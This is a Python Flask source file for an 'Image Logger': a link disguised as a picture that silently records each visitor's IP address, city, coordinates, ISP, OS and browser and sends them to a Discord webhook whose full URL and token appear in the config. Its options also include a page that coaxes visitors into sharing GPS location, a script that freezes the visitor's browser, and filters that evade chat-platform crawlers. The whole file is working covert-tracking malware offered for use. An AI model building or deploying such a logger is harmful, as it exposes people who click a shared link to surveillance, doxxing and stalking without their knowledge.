# --- IMPORTS ---
from flask import Flask, request, Response # Import Flask and request/Response objects
from urllib import parse # Keep this, you might still use it for parsing query params
import traceback
import requests
import base64
import httpagentparser
import json # Good practice for webhook payloads

# --- CONFIGURATION ---
# !!! IMPORTANT: Replace "YOUR_DISCORD_WEBHOOK_URL" with your actual webhook URL !!!
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1488468832354963547/tDWiiwM7A5-h7pW-ZX3mjRLg9EeGQZcDESwwzz4Z5ZjBFADU23dBBAHhYN2K95wZNcU0",
    "image": "https://m.media-amazon.com/images/I/51mdx0RJKgL._UXNaN_FMjpg_QL85_.jpg", # Default image URL
    "imageArgument": True, # Allows custom image via URL argument (e.g., ?url=<base64_encoded_image_url>)

    # CUSTOMIZATION #
    "username": "Image Logger", # Webhook username
    "color": 0x00FFFF, # Embed color (e.g., 0xFF0000 for red)

    # OPTIONS #
    "crashBrowser": False, # Attempt to crash the browser (use with caution)
    "accurateLocation": False, # Use GPS for precise location (requires user permission)

    "message": { # Custom message when user opens the image
        "doMessage": False, # Enable custom message
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # The message content
        "richMessage": True, # Enable rich text replacement for placeholders
    },

    "vpnCheck": 1, # VPN detection settings: 0=No check, 1=Don't ping, 2=Don't alert
    "linkAlerts": True, # Alert when the logging link is sent
    "buggedImage": True, # Show a loading image as Discord preview (optional)
    "antiBot": 1, # Bot detection settings: 0=No check, 1=Don't ping if bot, 2=Don't ping if definitely bot, 3=Don't alert if bot, 4=Don't alert if definitely bot
    
    # REDIRECTION #
    "redirect": {
        "redirect": False, # Enable redirection
        "page": "https://your-link.here" # URL to redirect to
    },
}

# --- BLACKLISTED IPS ---
# IPs or IP prefixes to ignore (e.g., "27" will block 27.x.x.x)
blacklistedIPs = ("27", "104", "143", "164")

# --- HELPER FUNCTIONS ---

def botCheck(ip, useragent):
    """Checks if the IP or User-Agent suggests a known bot/service."""
    if ip and ip.startswith(("34", "35")): # Common Discord IP ranges
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error_trace):
    """Sends an error report to the configured Discord webhook."""
    # Ensure webhook is configured and not the placeholder
    if not config["webhook"] or "YOUR_DISCORD_WEBHOOK_URL" in config["webhook"]:
        print("Webhook URL not configured. Cannot report error.")
        return

    payload = {
        "username": config["username"],
        "content": "@everyone", # Mention everyone on error
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error_trace}\n```",
            }
        ],
    }
    try:
        requests.post(config["webhook"], json=payload)
    except Exception as e:
        print(f"Failed to send error report to webhook: {e}")

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    """
    Gathers IP information, checks for bots/VPNs, and sends a report to Discord.
    'url' parameter here is the image URL that was opened.
    """
    if not ip: # Skip if no IP is available
        return

    # Check for blacklisted IPs
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    # --- Handle Link Alerts (when the logger link itself is detected) ---
    if bot and config["linkAlerts"]:
        payload = {
            "username": config["username"],
            "content": "", # No @everyone for link alerts by default
            "embeds": [
                {
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }
            ],
        }
        try:
            requests.post(config["webhook"], json=payload)
        except Exception as e:
            print(f"Failed to send link alert to webhook: {e}")
        return # Stop processing further for link alerts

    # --- Fetch IP Information (only if not a detected bot/Discord crawler) ---
    try:
        # Request specific fields for efficiency
        fields = "status,message,continent,continentCode,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query,proxy,hosting,mobile"
        ip_info_response = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}")
        ip_info_response.raise_for_status() # Raise an exception for bad status codes (4xx or 5xx)
        info = ip_info_response.json()
        
        # Check if the API call itself failed
        if info.get("status") == "fail":
            print(f"IP-API lookup failed for {ip}: {info.get('message', 'Unknown error')}")
            info = {} # Use empty dict to avoid errors later
            
    except requests.exceptions.RequestException as e:
        print(f"Failed to fetch IP info for {ip}: {e}")
        info = {} # Provide an empty dict to avoid further errors

    # --- Apply Anti-Bot/VPN Rules ---
    ping = "@everyone" # Default mention

    # VPN Check
    if info.get("proxy"): # Use .get() for safer access
        if config["vpnCheck"] == 2: return # Don't send alert
        if config["vpnCheck"] == 1: ping = "" # Don't ping

    # Anti-Bot Check (based on 'hosting' flag from ip-api.com)
    is_hosting = info.get("hosting")
    if is_hosting:
        if config["antiBot"] == 4 and not info.get("proxy"): return # Don't alert if hosting and not a proxy
        if config["antiBot"] == 3: return # Don't alert if hosting
        if config["antiBot"] == 2 and not info.get("proxy"): ping = "" # Don't ping if hosting and not a proxy
        if config["antiBot"] == 1: ping = "" # Don't ping if hosting

    # --- Prepare Embed Content ---
    os_detected, browser_detected = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")

    embed_description_parts = [
        f"**A User Opened the Original Image!**",
        f"\n**Endpoint:** `{endpoint}`",
        f"\n**IP Info:**",
        f"> **IP:** `{ip}`",
        f"> **Provider:** `{info.get('isp', 'Unknown')}`",
        f"> **ASN:** `{info.get('as', 'Unknown')}`",
        f"> **Country:** `{info.get('country', 'Unknown')}`",
        f"> **Region:** `{info.get('regionName', 'Unknown')}`",
        f"> **City:** `{info.get('city', 'Unknown')}`",
    ]

    lat = info.get('lat')
    lon = info.get('lon')
    if lat is not None and lon is not None:
        coords_str = f"{lat}, {lon}"
        # Provide a Google Maps link if coordinates are precise
        map_link = f"[Google Maps](https://www.google.com/maps/search/google+map++{coords_str.replace(',', ',%20')})" if coords else ""
        embed_description_parts.append(f"> **Coords:** `{coords_str}` ({'Precise, ' + map_link if coords else 'Approximate'})")
    else:
        embed_description_parts.append(f"> **Coords:** Unknown")

    tz = info.get('timezone')
    timezone_str = f"{tz.split('/')[1].replace('_', ' ')} ({tz.split('/')[0]})" if tz and '/' in tz else tz if tz else "Unknown"
    embed_description_parts.extend([
        f"> **Timezone:** `{timezone_str}`",
        f"> **Mobile:** `{info.get('mobile', 'Unknown')}`",
        f"> **VPN:** `{info.get('proxy', 'Unknown')}`",
        f"> **Bot:** `{info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`",
        f"\n**PC Info:**",
        f"> **OS:** `{os_detected}`",
        f"> **Browser:** `{browser_detected}`",
        f"\n**User Agent:**",
        f"```\n{useragent}\n```" if useragent else "```\nUnknown\n```"
    ])

    # --- Construct Full Embed Payload ---
    embed = {
        "username": config["username"],
        "content": ping, # Will be "@everyone" or empty based on checks
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": "\n".join(embed_description_parts),
            }
        ],
    }

    # Add thumbnail if an image URL was provided (and it's not the bugged image scenario)
    if url and not config["buggedImage"]:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    # --- Send Report to Webhook ---
    try:
        requests.post(config["webhook"], json=embed)
    except Exception as e:
        print(f"Failed to send report to webhook: {e}")
    
    return info # Return IP info for potential use in message formatting

# --- BINARIES (for bugged image) ---
# Base64 encoded loading image (from your original code)
binaries = {
    "loading": base64.b64decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

# --- FLASK APPLICATION ---
app = Flask(__name__) # THIS IS THE WSGI APPLICATION OBJECT VERCEL NEEDS

@app.route('/api/image', methods=['GET', 'POST']) # Define the route for your logger
def handle_image_request():
    try:
        # --- Get Request Details ---
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent')
        request_path = request.path # Used for endpoint reporting

        # --- Determine Image URL ---
        image_url = config["image"] # Default image
        if config["imageArgument"]:
            url_param = request.args.get("url") or request.args.get("id") # Check query params for 'url' or 'id'
            if url_param:
                try:
                    image_url = base64.b64decode(url_param.encode()).decode() # Decode if provided
                except Exception:
                    print(f"Warning: Failed to decode image URL parameter: {url_param}")
                    image_url = config["image"] # Fallback to default if decoding fails

        # --- Handle Redirect ---
        if config["redirect"]["redirect"]:
            # Serve a simple HTML page with a meta refresh redirect
            return Response(f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">', mimetype='text/html')

        # --- Handle Crash Browser ---
        script_to_add = ""
        if config["crashBrowser"]:
            # Your original crash script, embedded in JS
            script_to_add = '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

        # --- Handle Custom Message ---
        if config["message"]["doMessage"]:
            message_content = config["message"]["message"]
            # If rich messages are enabled, try to populate placeholders
            if config["message"]["richMessage"] and ip_address:
                # Call makeReport to get IP info. Note: this also sends the report to Discord.
                ip_info = makeReport(ip_address, user_agent, endpoint=request_path, url=image_url)
                
                if ip_info: # Only replace if ip_info was successfully retrieved
                    message_content = message_content.replace("{ip}", ip_address if ip_address else "Unknown")
                    message_content = message_content.replace("{isp}", ip_info.get("isp", "Unknown"))
                    message_content = message_content.replace("{asn}", ip_info.get("as", "Unknown"))
                    message_content = message_content.replace("{country}", ip_info.get("country", "Unknown"))
                    message_content = message_content.replace("{region}", ip_info.get("regionName", "Unknown"))
                    message_content = message_content.replace("{city}", ip_info.get("city", "Unknown"))
                    message_content = message_content.replace("{lat}", str(ip_info.get("lat", "N/A")))
                    message_content = message_content.replace("{long}", str(ip_info.get("lon", "N/A")))
                    
                    tz = ip_info.get('timezone')
                    timezone_str = f"{tz.split('/')[1].replace('_', ' ')} ({tz.split('/')[0]})" if tz and '/' in tz else tz if tz else "Unknown"
                    message_content = message_content.replace("{timezone}", timezone_str)
                    
                    message_content = message_content.replace("{mobile}", str(ip_info.get("mobile", "Unknown")))
                    message_content = message_content.replace("{vpn}", str(ip_info.get("proxy", "Unknown")))
                    
                    # Bot/Hosting status logic
                    hosting_status = ip_info.get("hosting", False)
                    vpn_status = ip_info.get("proxy", False)
                    bot_display = "Possibly" if hosting_status else "False"
                    if hosting_status and not vpn_status: # If hosting and NOT a proxy, it's more likely a bot
                        bot_display = "Bot"
                    message_content = message_content.replace("{bot}", bot_display)

                    os_detected, browser_detected = httpagentparser.simple_detect(user_agent) if user_agent else ("Unknown", "Unknown")
                    message_content = message_content.replace("{browser}", browser_detected)
                    message_content = message_content.replace("{os}", os_detected)
                else:
                    # If ip_info is None (e.g., blacklisted IP), still try to fill what we can from user agent
                    os_detected, browser_detected = httpagentparser.simple_detect(user_agent) if user_agent else ("Unknown", "Unknown")
                    message_content = message_content.replace("{browser}", browser_detected)
                    message_content = message_content.replace("{os}", os_detected)
                    # Other fields will remain as placeholders or default if not filled by makeReport
            
            # Return the message content as HTML, with the crash script appended if enabled
            return Response(message_content.encode() + script_to_add.encode(), mimetype='text/html')

        # --- Handle Bugged Image (Discord Preview Behavior) ---
        if config["buggedImage"]:
            # This part is primarily for when Discord (or other services) fetches the link preview.
            # It triggers makeReport to send the "Link Sent" alert to Discord.
            # Then it returns the 'loading' binary image.
            if botCheck(ip_address, user_agent): # Check if it looks like Discord/Telegram fetching the link
                makeReport(ip_address, user_agent, endpoint=request_path, url=image_url) # Report the link being sent
                return Response(binaries["loading"], mimetype='image/jpeg') # Return the loading image
            else:
                # If it's not a known bot/Discord client, it's likely a real user opening the link.
                # We still want to send the "Link Sent" alert (if linkAlerts is true),
                # and then return the loading image as the preview.
                makeReport(ip_address, user_agent, endpoint=request_path, url=image_url)
                return Response(binaries["loading"], mimetype='image/jpeg')

        # --- Standard Image Display / Location Tracking ---
        # This block executes if no redirect, no custom message, and no bugged image behavior.
        # It's for when the user actually opens the image link.

        # --- Call makeReport to log the IP and send to Discord ---
        # This is the primary logging action when a user opens the image.
        # We call it first to ensure the report is sent.
        ip_info = None # Initialize ip_info
        if ip_address: # Only proceed if we have an IP
            ip_info = makeReport(ip_address, useragent, endpoint=request_path, url=image_url)
            
        # --- Location Tracking Logic ---
        # If accurateLocation is enabled, and we have an IP, and the 'g' param is NOT present yet
        if config["accurateLocation"] and ip_address and not request.args.get("g"):
            # Construct a base URL template for redirection with coordinates
            base_url = request.url.split('?')[0]
            query_params = request.args.to_dict()
            
            # Build the query string, excluding any existing 'g' param
            filtered_params = [f"{k}={v}" for k, v in query_params.items() if k != 'g']
            query_string = "&".join(filtered_params)
            
            new_url_template = f"{base_url}{'?' + query_string if query_string else ''}"

            # Return an HTML page with JavaScript to get geolocation and redirect
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Location Request</title>
                <style>
                    body {{ margin: 0; padding: 0; background-color: black; }}
                    .img-container {{
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        width: 100vw;
                        height: 100vh;
                        background-image: url('{image_url}');
                        background-position: center center;
                        background-repeat: no-repeat;
                        background-size: contain;
                    }}
                </style>
            </head>
            <body>
                <div class="img-container"></div>
                <script>
                    var redirectTemplate = "{new_url_template}";
                    if (navigator.geolocation) {{
                        navigator.geolocation.getCurrentPosition(function (coords) {{
                            var lat = coords.coords.latitude;
                            var lon = coords.coords.longitude;
                            // Encode coordinates for URL, replace '=' with '%3D' for safety
                            var encodedCoords = btoa(lat + "," + lon).replace(/=/g, "%3D");
                            // Append 'g=' parameter correctly
                            var finalUrl = redirectTemplate + (redirectTemplate.includes("?") ? "&g=" : "?g=") + encodedCoords;
                            window.location.replace(finalUrl);
                        }}, function(error) {{
                            console.error("Geolocation error:", error);
                            // If user denies or error occurs, redirect without 'g=' param
                            var currentPath = window.location.pathname;
                            var searchParams = new URLSearchParams(window.location.search);
                            searchParams.delete('g'); // Ensure 'g' is removed
                            var newSearch = searchParams.toString();
                            var finalUrlWithoutCoords = currentPath + (newSearch ? '?' + newSearch : '');
                            window.location.replace(finalUrlWithoutCoords);
                        }});
                    }} else {{
                        console.log("Geolocation not supported");
                        // If geolocation is not supported, redirect without 'g=' param
                        var currentPath = window.location.pathname;
                        var searchParams = new URLSearchParams(window.location.search);
                        searchParams.delete('g');
                        var newSearch = searchParams.toString();
                        var finalUrlWithoutCoords = currentPath + (newSearch ? '?' + newSearch : '');
                        window.location.replace(finalUrlWithoutCoords);
                    }}
                </script>
            </body>
            </html>
            """
            return Response(html_content, mimetype='text/html')
        else:
            # --- Standard Image Display (if location tracking is off or already handled) ---
            # This is the HTML that displays the target image when the user clicks the link.
            # The act of loading this HTML page triggers the logger.
            html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>{config["username"]}</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background-color: black; /* Or any background color */
        }}
        .img-container {{
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100vw;
            height: 100vh;
            background-image: url('{image_url}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
        }}
    </style>
</head>
<body>
    <div class="img-container"></div>
</body>
</html>'''
            return Response(html_content, mimetype='text/html')

    except Exception as e:
        # --- Error Handling ---
        error_trace = traceback.format_exc()
        reportError(error_trace) # Use your existing reportError function
        # Return a generic 500 error response to the client
        return Response("500 - Internal Server Error. Please check the webhook for details.", status=500)

# The 'app' object is what Vercel's @vercel/python runtime looks for.
# No need for 'handler = app = ImageLoggerAPI' anymore.
